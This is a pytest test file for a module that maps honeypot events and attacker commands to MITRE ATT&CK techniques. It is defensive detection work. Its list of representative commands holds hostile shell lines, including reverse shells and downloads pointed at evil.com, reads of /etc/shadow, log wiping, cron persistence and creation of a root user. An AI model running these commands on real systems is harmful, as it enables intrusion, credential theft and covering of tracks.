"""Unit tests for the MITRE rule table (mitre.py)."""
import re

import pytest

from mitre import MITRE_RULES, EVENT_TYPE_RULES, map_event_to_mitre


def distinct_techniques():
    return {
        rule["technique"]
        for rule in MITRE_RULES
    } | {t for _, (t, _) in EVENT_TYPE_RULES}


# ---------------------------------------------------------------------------
# Table shape
# ---------------------------------------------------------------------------
def test_rule_table_expanded_to_target_size():
    """The user asked for 15-20 techniques; assert both the keyword rules and
    the distinct technique IDs land in that band."""
    assert 15 <= len(MITRE_RULES) <= 20
    assert 15 <= len(distinct_techniques()) <= 25


def test_every_technique_has_valid_attck_id():
    pattern = re.compile(r"^T\d{4}(\.\d{3})? - .+")
    for technique in distinct_techniques():
        assert pattern.match(technique), f"Bad technique label: {technique!r}"


def test_every_rule_has_positive_weight():
    for rule in MITRE_RULES:
        assert rule["weight"] > 0
        assert rule["keywords"]
    for _, (_, weight) in EVENT_TYPE_RULES:
        assert weight > 0


# ---------------------------------------------------------------------------
# Each keyword rule matches its own representative command
# ---------------------------------------------------------------------------
REPRESENTATIVE_COMMANDS = [
    ("whoami", "T1033"),
    ("id", "T1033"),
    ("uname -a", "T1082"),
    ("cat /etc/passwd", "T1003.008"),
    ("cat /etc/shadow", "T1003.008"),
    ("cat /etc/sudoers", "T1003.008"),
    ("wget http://evil.com/tool.sh", "T1105"),
    ("curl -O http://evil.com/tool", "T1105"),
    ("scp user@evil.com:/tmp/kit .", "T1105"),
    ("chmod +x /tmp/tool.sh", "T1222.002"),
    ("chmod 777 /tmp/tool.sh", "T1222.002"),
    ("rm -rf /var/log/*", "T1070"),
    ("history -c", "T1070"),
    ("nc -e /bin/sh evil.com 4444", "T1071"),
    ("bash -i >& /dev/tcp/evil.com/4444 0>&1", "T1071"),
    ("python -c 'import socket; ...'", "T1071"),
    ("perl -e 'exec \"/bin/sh\"'", "T1071"),
    ("crontab -e", "T1053.003"),
    ("echo '* * * * * root /tmp/x.sh' >> /etc/crontab", "T1053.003"),
    ("cat ~/.ssh/authorized_keys", "T1098.004"),
    ("ssh-keygen -t rsa", "T1098.004"),
    ("useradd -o -u 0 attacker", "T1136.001"),
    ("adduser hacker", "T1136.001"),
    ("passwd root", "T1098"),
    ("echo 'root:newpass' | chpasswd", "T1098"),
    ("iptables -F", "T1562.004"),
    ("ufw disable", "T1562.004"),
    ("firewall-cmd --offline", "T1562.004"),
    ("tar -cvf /tmp/all.tar /etc", "T1560.001"),
    ("zip -r loot.zip /etc/passwd", "T1560.001"),
    ("nmap -sV 10.0.0.0/24", "T1046"),
    ("nc -z victim 22", "T1046"),
    ("sudo -i", "T1548.003"),
    ("su - root", "T1548.003"),
    ("netstat -an", "T1016"),
    ("ifconfig -a", "T1016"),
    ("ip addr show", "T1016"),
]


@pytest.mark.parametrize("command,expected_prefix", REPRESENTATIVE_COMMANDS)
def test_keyword_rule_matches_representative_command(command, expected_prefix):
    technique, weight = map_event_to_mitre("command", command)
    assert technique is not None, f"No rule matched {command!r}"
    assert technique.startswith(expected_prefix), (
        f"{command!r} -> {technique}, expected {expected_prefix}*"
    )
    assert weight > 0


def test_non_matching_command_returns_no_technique():
    assert map_event_to_mitre("command", "ls -la /tmp") == (None, 0.0)
    assert map_event_to_mitre("command", "pwd") == (None, 0.0)
    assert map_event_to_mitre("command", "") == (None, 0.0)
    assert map_event_to_mitre("command", None) == (None, 0.0)


# ---------------------------------------------------------------------------
# Event-type rules (Cowrie + Dionaea)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "event_type,expected_prefix",
    [
        ("login", "T1078"),
        ("login_failed", "T1110"),
        ("download", "T1105"),
        ("file_upload", "T1505.003"),
        ("smb", "T1210"),
        ("shellcode", "T1210"),
        ("http_request", "T1190"),
        ("sip", "T1190"),
        ("vnc", "T1190"),
        ("upnp", "T1190"),
        ("scan", "T1046"),
        ("pcap", "T1046"),
        ("redis", "T1110"),
        ("smtp", "T1071.003"),
    ],
)
def test_event_type_rules(event_type, expected_prefix):
    technique, weight = map_event_to_mitre(event_type, None)
    assert technique is not None
    assert technique.startswith(expected_prefix)
    assert weight > 0


def test_failed_login_beats_successful_login():
    """'login_failed' must be matched before the generic 'login' rule."""
    technique, _ = map_event_to_mitre("login_failed", None)
    assert technique.startswith("T1110")


def test_protocol_login_variants():
    # Dionaea FTP/SMB/MySQL login events still fall through to login rules
    t, _ = map_event_to_mitre("ftp_login", None)
    assert t.startswith("T1078")
    t, _ = map_event_to_mitre("ftp_login_failed", None)
    assert t.startswith("T1110")
    t, _ = map_event_to_mitre("mssql_login", None)
    assert t.startswith("T1078")


# ---------------------------------------------------------------------------
# Matching semantics
# ---------------------------------------------------------------------------
def test_credential_dump_wins_over_password_rule():
    """'cat /etc/passwd' contains 'passwd' but must resolve to credential
    dumping, not account manipulation, thanks to rule ordering."""
    technique, _ = map_event_to_mitre("command", "cat /etc/passwd")
    assert technique.startswith("T1003.008")


def test_case_insensitive_matching():
    assert map_event_to_mitre("COMMAND", "WHOAMI")[0].startswith("T1033")
    assert map_event_to_mitre("Command", "Cat /etc/Passwd")[0].startswith("T1003.008")
    assert map_event_to_mitre("LOGIN_FAILED", None)[0].startswith("T1110")


def test_word_boundary_prevents_short_keyword_false_positives():
    # 'id' must not match inside 'rapid'
    assert map_event_to_mitre("command", "rapid") == (None, 0.0)
    # 'su' must not match inside 'sudo' when only the bare 'su' keyword would hit
    technique, _ = map_event_to_mitre("command", "sudo -i")
    assert technique.startswith("T1548.003")


def test_unknown_event_type_returns_no_technique():
    assert map_event_to_mitre("session.closed", None) == (None, 0.0)
    assert map_event_to_mitre("unknown.foo", None) == (None, 0.0)
